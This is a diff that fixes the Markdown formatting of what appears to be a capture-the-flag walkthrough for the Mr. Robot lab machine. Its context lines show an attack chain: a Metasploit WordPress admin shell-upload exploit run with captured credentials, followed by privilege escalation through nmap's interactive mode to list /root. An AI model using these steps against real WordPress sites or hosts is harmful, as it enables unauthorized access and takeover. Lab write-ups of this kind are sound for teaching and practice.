@@ -56,7 +56,8 @@ Use
 ``` bash
 cat fsocity.dic | more
 ```
-Use the next command to find unique words per line  
+Use the next command to find unique words per line 
+
 ```bash
 sort fsocity.dic| uniq | wc -l
 ```
@@ -117,6 +118,7 @@ exploit/unix/webapp/wp_admin_shell_upload or use 1
 We’re going to use a Metasploit Module that will create a malicious plugin and upload it to the WordPress installation, giving us a meterpreter shell back.
 
 Use 
+
 ```bash
 show options
 ```
@@ -125,13 +127,15 @@ show options
 
 Use:- 
 
-msf6 exploit(unix/webapp/wp_admin_shell_upload) >    
+msf6 exploit(unix/webapp/wp_admin_shell_upload) >  
+
 ```bash 
 set PASSWORD ER28-0652
 ```
 PASSWORD => ER28-0652
 msf6 exploit(unix/webapp/wp_admin_shell_upload) > 
-``bash 
+
+```bash 
 set USERNAME elliot
 ```
 USERNAME => elliot
@@ -187,11 +191,13 @@ Use
 ```bash
 nmap –interactive
 ```
+
 ```bash
 !whoami
 ```
 
-```bash !ls /root
+```bash
+!ls /root
 ```
 
 ```bash
